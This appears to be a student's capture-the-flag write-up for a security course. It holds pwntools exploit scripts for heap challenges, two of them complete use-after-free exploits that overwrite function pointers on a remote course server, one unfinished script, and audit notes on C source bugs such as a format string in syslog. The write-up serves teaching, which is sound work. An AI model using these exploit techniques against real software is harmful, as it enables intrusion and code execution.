usemedontabuseme
==================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNi11c2VtZWRvbnRhYnVzZW1lIiwiaXAiOiIxMTUuMTI5LjIwLjM4Iiwic2Vzc2lvbiI6ImY5Yjg2ZWU1LTJkZjctNGE3Ny04Yjk0LWRkMzRmMGU2MDI1MCJ9.HCmXravDKFvZWEidz-8gunPy7cVhjXiu2aSSRIy29PI}
General overview of problems faced
-----------------------------------------------------
Can't overflow name because of fgets only reads 8 bytes.
However, it looks like the hint says the heap gets corrupted when more than 6 characters are entered as the name.
You can still change the name of a clone even when deleted.
Creating and deleting a clone changes the name field past the 4th character.
Have to find a suitable address to overwrite.
Getting seg faults where eip is 0x6447, malloc.c no such file depending on what address I overwrite with.
Script/Command used
-----------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './usemedontabuseme' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 22488 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
win = p32(0x804967c)
free = p32(0x8049206)
name = b''
# Create first clone
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'0')
p.recvuntil(b"): ", drop=True)
p.sendline(name)
# Create second clone
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'1')
p.recvuntil(b"): ", drop=True)
p.sendline(name)
# Kill both clones
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'b')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'0')
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'b')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'1')
# Leak first clone address
p.recvuntil(b"Choice: ", drop=True)
p.sendline(b'd')
p.recvuntil(b"ID: ", drop=True)
p.sendline(b'1')
p.recvuntil(b"Name: ", drop=True)
leak = p.recvline()
leak = leak[0:4]
log.info(f"Leak is: {hex(u32(leak))}")
leak = u32(leak)+  0xc
# Rename first clone
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'c')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'0')
p.recvuntil(b"): ", drop=True)
p.sendline(p32(leak))
# Create three clones, the last clone with the win function
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'2')
p.recvuntil(b"): ", drop=True)
p.sendline(name)
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'3')
p.recvuntil(b"): ", drop=True)
p.sendline(name)
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'4')
p.recvuntil(b"): ", drop=True)
p.sendline(win)
# Kill the second last clone
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'h')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'3')
p.interactive()
```

ezpz1
========================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNi1lenB6MSIsImlwIjoiMTE1LjEyOS4yMC4zOCIsInNlc3Npb24iOiI3YWNiODIxZC02ZGFlLTQ5YzEtYjRlMS0yNmJkMGNlZGIwNTIifQ.B9qki13wTIfqtvGkteyV4Rbt9NOoOgL_2N4gpKSF57Y}
General overview of problems faced
--------------------------------------------------------
Double free is detected
You can still set a question even if free so thats a use after free
No overflows with fgets
Heap is hard to understand
Script/Command used
---------------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './ezpz1' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 18373 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
win = 0x804950c
def create():
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'c')

def delete(id):
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'd')
    p.recvuntil(b"id: ", drop=True)
    p.sendline(id)

def set(id, input):
    p.recvuntil(b"): ", drop=True)
    p.sendline(b's')
    p.recvuntil(b"id: ", drop=True)
    p.sendline(id)
    p.recvuntil(b"question: ", drop=True)
    p.sendline(input)

def ask(id):
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'a')
    p.recvuntil(b"id: ", drop=True)
    p.sendline(id)

create()
delete(b'0')
create()
set(b'1', p32(win))
ask(b'0')

p.interactive()
```

ezpz2
============================================================
Flag:
General overview of problems faced
----------------------------------------------------------
No win function
No double free
The fgets now read reads 0x78 so we can now overflow so we can overflow one question to overwrite the second question's chunk.
Need to figure out libc version to do some rop chains.
Script/Command used
----------------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './notezpz2' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 6691 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def create():
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'c')

def delete(id):
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'd')
    p.recvuntil(b"id: ", drop=True)
    p.sendline(id)

def set(id, input):
    p.recvuntil(b"): ", drop=True)
    p.sendline(b's')
    p.recvuntil(b"id: ", drop=True)
    p.sendline(id)
    p.recvuntil(b"question: ", drop=True)
    p.sendline(input)

def ask(id):
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'a')
    p.recvuntil(b"id: ", drop=True)
    p.sendline(id)

payload = b''
create()
create()
set(b'0',b'a'*40 + payload)
ask(b'0')
p.interactive()
```

notezpz
===============================================================
Flag:
General overview of problems faced
--------------------------------------------------------------

Script/Command used
-----------------------------------------------------------
```

```

notezpz2
===============================================================
Flag:
General overview of problems faced
--------------------------------------------------------------

Script/Command used
------------------------------------------------------------------
```

```

1.c src challenge
============================================================
General overview of problems faced
-----------------------------------------------------------
line : bug
12   : No checks for negative input. User can input a nagative number into len. If len + header_size is negative (user inputs a number less than -8), len + header_size underflows to a large number since the field it occupies takes in a size_t type which is only positive. This means we can read data larger than the size of the storage and leak data.

2.c src challenge
=============================================================
General overview of problems faced
Had to look up functions to see exactly how they worked.
Had to look up if buffers were automatically null terminated.
Needed to look up where syslog keeps its logs.
-------------------------------------------------------------------
line : bug
45   : strtok tries to get the argument after user input "login " and expects user input in the form of a username. However, if the user just inputs "login", data outside of the buffer may be read and put into the user struct because the buffer is not automatically terminated (char buf[512] does not include a terminator, only string literals such as "abcd", according to stack overflow). It will only stop reading once a new line terminator, 0x0A, is encountered or  a null terminator to indicate the end of the string. The data is then printf'd as a string so it is immediately leaked. You could use command "user" to leak the auth in this case. To fix, zero fill the memory region of buf, or add checks to only check for args within the buf size.
58   : The auth field is type char but find_permission_level(arg) returns an int. This means that an int outside the range of a char can give an auth char that gives admin access. 
68   : Similar to line 45. The if the user only inputs "run", strtok will read region of memory 5 chars after the start of buf. Since this region would be random junk as buf[512]; does not include any terminators, it would read random junk as the arg. 
75   : syslog's second argument, strdup(arg), is taken as a form const char *format. This means that there is a format string vulnerability here if a user uses the command "run %x %p %s" where data can be leaked and access in var/log/syslog. It is even possible to overwrite memory using %n. One possibility is if attackers can overwrite the auth field in the user struct, they can pop shells and gain access to the system.
